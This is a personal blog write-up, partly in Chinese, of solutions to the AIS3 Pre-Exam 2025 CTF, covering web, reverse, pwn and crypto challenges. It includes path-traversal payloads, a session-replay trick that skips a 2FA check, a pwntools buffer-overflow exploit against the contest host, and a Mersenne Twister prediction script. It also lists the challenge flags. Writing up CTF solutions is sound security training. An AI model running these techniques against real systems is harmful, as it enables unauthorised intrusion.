---
title: "AIS3 Pre-Exam 2025 Write Up"
date: 2025-10-13T02:17:47+08:00
draft: false # Set 'false' to publish
tableOfContents: false # Enable/disable Table of Contents
description: ''
categories:
  - CTF 
tags:
  - Write Up
---

## Before Start...

翻到之前 6月 Pre-exam 要繳交的 WP，雖然題目的資訊沒記多少，寫的爛爛的，但還是放這留一下紀錄。  
阿不要問為什麼是寫英文  
![alt text](idk.png)  


[記分板](./IMG_0089.png)  

---

username: `hlc23`  
rank: `#106/389` 

## Tomorin db (web)
Path travel.
payload: `/%2fflag`  
I don't think this is expected solution, but it works.  
flag:`AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}`

## Ramen CTF (misc)
OSINT    
scan left qrcode on receipt to get data (MF16879911)  
search on  
https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search  
flag: `AIS3{樂山溫泉拉麵:蝦拉麵}`

##  AIS3 Tiny Server - Web / Misc (misc)
path traversal to root  
payload: `../../.././../` to see the flag  

## web flag checker (rev)
decompile wasm use [wabt decompile](https://github.com/WebAssembly/wabt?tab=readme-ov-file#running-wasm-decompile)  
idk how to decrypto so ask ai.  
flag: `AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`  
```py
def reverse_rotate(value, shift):
    """反向旋轉位移操作"""
    shift = shift & 63
    return ((value >> shift) | (value << (64 - shift))) & 0xFFFFFFFFFFFFFFFF

# 已知的加密後的值
encrypted_values = [
    7577352992956835434,
    7148661717033493303,
    -7081446828746089091 & 0xFFFFFFFFFFFFFFFF,
    -7479441386887439825 & 0xFFFFFFFFFFFFFFFF,
    8046961146294847270
]

# 用於獲取位移量的魔數
magic = -39934163

flag = ""
for i in range(5):
    # 計算位移量
    shift = (magic >> (i * 6)) & 63
    
    # 反向旋轉
    decoded = reverse_rotate(encrypted_values[i], shift)
    
    # 將 64 位元整數轉換為 8 個字元
    for j in range(8):
        char = chr((decoded >> (j * 8)) & 0xFF)
        flag += char

print(flag)
```


## Login Screen 1 (web)
login as guest to `dashboard.php`. store the request with burpsuit repeater. then logout.   
login as admin in `index.php`. then send the stored request.  
the session will be the same as previous, but 2fa was checked. so as user name `admin` be use, we get the flag.  
flag: `AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}`  

## AIS3 Tiny Server - Reverse (rev)
use `strings` see a `AIS3-Flag` and `Flag Correct!` text, open in IDA to see the string use at `0x23F4`, it is a if statement with condition function `0x1E20`  
reverse this function and get flag.  
flag: `AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}`  

## Welcome to the World of Ave Mujica🌙 (pwn)
There is a `Welcome_to_the_world_of_Ave_Mujica` win function exist at `0x401256`, so return to it.  
In `read_Int8` function, not check the number is positive or not, so `-1` to bypass.    
the offset from `buf` to return address of main function is 168.  
so payload will be: `padding * 168` + `0x401256`  
flag: `AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._a3572d8bdc809f8746aa35480079d5d8}`  
```py
from pwn import *

nc = "nc chals1.ais3.org 60126"
r = remote(nc.split()[1], int(nc.split()[2]))
r.recvuntil(b'?\n')
r.sendline(b'yes')
print('send yes')
r.recvuntil(b': ')
r.sendline(b'-1')
print('send -1')
r.recvuntil(b': ')

shell = 0x401256
payload = b''
payload += cyclic(168) # paddings
payload += p64(shell) # shellcode address

r.sendline(payload)
print('send payload')
r.interactive()
```

## Stream (crypto)

chal files: [stream.py](./stream.py) [output.txt](./output.txt)

From python doc  
> `getrandbits()` This method is supplied with the Mersenne Twister generator   

and the MT19937 can be predict by observing a sufficient number of consecutive outputs.

The `output.txt` give enough number to predict if we reverse the xor operation.  
Enum all sha512 of `os.urandom(True)`, brute force to find each `getrandbits(256)` and `math.isqrt()` to check.
so we can use mt19937predictor to predict the next number.
flag:`AIS3{no_more_junks...plz}`
```py
from math import isqrt
from hashlib import sha512
from mt19937predictor import MT19937Predictor

enum_urandom = [bytes([i]) for i in range(256)] # 256 possible values
sha512_hashes = [sha512(v).digest() for v in enum_urandom]

with open('output.txt', 'r') as f:
    lines = f.readlines()

predictor = MT19937Predictor()

for i in range(80):
    for e, h in enumerate(sha512_hashes):
        hash_byte = int.from_bytes(h)
        xor_value = int(lines[i].strip(), 16) ^ hash_byte
        
        root = isqrt(xor_value)
        if root * root == xor_value:
            predictor.setrandbits(root, 256)
            print(f"Recovered state for line {i}: {e:02x} (xor value: {xor_value:02x})")
            break

flag = int(lines[80].strip(), 16)
flag = flag ^ (predictor.getrandbits(256)**2)

byte_length = (flag.bit_length() + 7) // 8
bytes_result = flag.to_bytes(byte_length, 'big')
print(f"Recovered flag: {bytes_result}")
```

## A_simple_snake_game 
chal file [here](./snake.zip)  
In `SnakeGame::Screen::drawText`, found wired xor operation.
```cpp
for ( i = 0; ; ++i )
    {
      v4 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length(v19);
      if ( i >= v4 )
        break;
      lpuexcpt = *(_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](i);
      v9 = SnakeGame::hex_array1[i];
      *(_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](i) = v9 ^ lpuexcpt;
    }
```
Find the xor array in data `0x04E3020`.
```
.data:004E3020 __ZN9SnakeGame10hex_array1E db 0C0h, 19h, 3Ah, 0FDh, 0CEh, 68h, 0DCh, 0F2h, 0Ch, 47h
.data:004E3020                                         ; DATA XREF: SnakeGame::Screen::drawText(int,int)+15C↑o
.data:004E302A                 db 0D4h, 86h, 0ABh, 57h, 39h, 0B5h, 3Ah, 8Dh, 13h, 47h
.data:004E3034                 db 3Fh, 7Fh, 71h, 98h, 6Dh, 13h, 0B4h, 1, 90h, 9Ch, 46h
.data:004E303F                 db 3Ah, 0C6h, 33h, 0C2h, 7Fh, 0DDh, 71h, 78h, 9Fh, 93h
.data:004E3049                 db 22h, 55h, 15h dup(0)
```
reverse the xor operation to get the flag.
flag:`AIS3{CH3aT_Eng1n3?_0fcau53_I_bo_1T_by_hAnD}`

---

## Afterword

WP 就上面這些。  

自從解出 Stream 之後 看到 Python random 都想做預測 lol  

記得當時 Vincent55 有出 [Misc] nocall 🈲📞 沒解出來但發現有留[題目](./pyjail.py)  
解答請見 [Github](https://github.com/Vincent550102/My-CTF-Challenge/tree/main/AIS3-preexam/2025)  

之後有翻到其他東西再補  